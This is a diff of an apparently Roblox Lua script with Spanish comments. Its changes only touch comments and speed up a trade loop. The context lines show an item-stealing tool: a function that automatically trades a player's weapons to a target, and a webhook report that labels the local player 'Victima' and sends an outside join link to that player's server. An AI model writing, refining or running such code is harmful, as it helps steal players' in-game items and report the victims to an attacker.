@@ -16,6 +16,7 @@ if not req then
     return
 end
 
+-- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix, thumbnail)
     local data = {
         ["content"] = prefix or "",
@@ -115,11 +116,11 @@ local function doTrade(targetName)
             weaponsToSend = {} -- Se vacía la lista
             acceptTrade()
         end
-        task.wait(0.3)
+        task.wait(0.2)
     end
 end
 
--- Enviar webhook con imagen en esquina
+-- Enviar webhook con imagen en la esquina
 local joinLink = "https://fern.wtf/joiner?placeId="..game.PlaceId.."&gameInstanceId="..game.JobId
 local fields = {
     {name="Victima👤:", value=LocalPlayer.Name, inline=true},
